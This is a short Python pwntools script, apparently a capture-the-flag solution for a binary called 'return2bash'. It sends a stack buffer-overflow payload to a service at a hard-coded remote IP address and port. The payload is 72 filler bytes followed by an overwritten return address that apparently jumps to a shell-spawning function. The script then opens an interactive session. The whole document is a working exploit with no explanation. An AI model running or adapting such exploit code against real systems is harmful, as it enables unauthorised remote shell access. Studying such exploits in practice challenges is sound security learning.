from pwn import *

elf = ELF("./return2bash")

#p = elf.process()
raw_input("DEBUG")
p = remote("103.107.183.244", 9703)

payload = b"A"*72
payload += p64(0x400720)

p.sendline(payload)

p.interactive()
